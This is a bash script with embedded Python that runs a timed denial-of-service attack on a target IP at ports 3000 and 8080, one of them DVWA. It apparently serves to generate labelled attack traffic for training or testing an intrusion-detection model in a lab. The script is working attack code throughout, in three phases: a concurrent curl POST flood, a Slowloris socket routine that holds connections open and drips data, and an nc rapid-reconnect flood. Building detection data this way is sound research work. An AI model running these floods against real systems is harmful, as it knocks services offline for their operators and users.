#!/bin/bash
# DoS Attack — Resource exhaustion via sustained medium-data connections
# Targets: port 3000 (ML WebApp) and 8080 (DVWA) — both confirmed active.
#
# Creates DISTINCTIVE flow signatures vs benign:
#   Phase 1 (50%): HTTP POST flood with 1-5KB payloads
#            → high fwd_bytes, many concurrent connections per session
#   Phase 2 (30%): Slowloris — hold connections open, drip data slowly
#            → very long flowDuration, high packetTotalCount, low IAT
#   Phase 3 (20%): Rapid reconnect — uniform short connections
#            → many same-size flows on same dst_port (distinctive pattern)
#
# Environment: TARGET_IP, DURATION (seconds)
set -e

TARGET="${TARGET_IP:?TARGET_IP not set}"
DUR="${DURATION:-60}"
PORTS=(3000 8080)

echo "[DoS] Starting resource exhaustion attack on $TARGET for ${DUR}s"
echo "[DoS] Target ports: ${PORTS[*]}"

# Pre-generate payloads
dd if=/dev/urandom bs=5000 count=1 2>/dev/null | base64 > /tmp/dos_5k.txt
dd if=/dev/urandom bs=1000 count=1 2>/dev/null | base64 > /tmp/dos_1k.txt

# ═══════════════════════════════════════════════════════════
# Phase 1: HTTP POST flood (50% of time)
# Distinctive: fwd_bytes 1-5KB per flow (benign is ~300B), many concurrent
# ═══════════════════════════════════════════════════════════
P1_DUR=$((DUR * 50 / 100))
echo "[DoS] Phase 1: HTTP POST flood for ${P1_DUR}s"
P1_END=$(($(date +%s) + P1_DUR))

while [ "$(date +%s)" -lt "$P1_END" ]; do
    for port in "${PORTS[@]}"; do
        for i in $(seq 1 15); do
            curl -s -o /dev/null -m 4 -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d @/tmp/dos_5k.txt \
                "http://${TARGET}:${port}/login" 2>/dev/null &
            curl -s -o /dev/null -m 4 -X POST \
                -d @/tmp/dos_1k.txt \
                "http://${TARGET}:${port}/" 2>/dev/null &
        done
    done
    wait
    sleep 0.1
done

# ═══════════════════════════════════════════════════════════
# Phase 2: Slowloris — hold connections open, drip data (30%)
# Distinctive: very long duration per flow, many small packets
# ═══════════════════════════════════════════════════════════
P2_DUR=$((DUR * 30 / 100))
echo "[DoS] Phase 2: Slowloris connections for ${P2_DUR}s"

python3 -c "
import socket, time

TARGET = '$TARGET'
DUR = $P2_DUR
PORTS = [3000, 8080]
end_time = time.time() + DUR
CHUNK = b'X' * 500

while time.time() < end_time:
    sockets = []
    for port in PORTS:
        for _ in range(20):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(8)
                s.connect((TARGET, port))
                s.send(f'POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: 1000000\r\nContent-Type: application/octet-stream\r\n\r\n'.encode())
                sockets.append(s)
            except:
                pass
    # Drip: 500B every 2s for ~16s per batch
    for _ in range(8):
        if time.time() >= end_time:
            break
        for s in list(sockets):
            try:
                s.send(CHUNK)
            except:
                sockets.remove(s)
        time.sleep(2)
    for s in sockets:
        try: s.close()
        except: pass
print('[Slowloris] Completed')
" || true

# ═══════════════════════════════════════════════════════════
# Phase 3: Rapid reconnect flood (20% of time)
# Distinctive: many uniform short connections (same size, same pattern)
# ═══════════════════════════════════════════════════════════
P3_DUR=$((DUR * 20 / 100))
echo "[DoS] Phase 3: Rapid reconnect flood for ${P3_DUR}s"
P3_END=$(($(date +%s) + P3_DUR))

while [ "$(date +%s)" -lt "$P3_END" ]; do
    for port in "${PORTS[@]}"; do
        for i in $(seq 1 40); do
            (echo -ne "POST / HTTP/1.1\r\nHost: ${TARGET}\r\nContent-Length: 100\r\n\r\n$(head -c 100 /dev/urandom | base64)" | nc -w 2 "$TARGET" "$port" 2>/dev/null || true) &
        done
    done
    wait
    sleep 0.05
done

echo "[DoS] Attack complete"
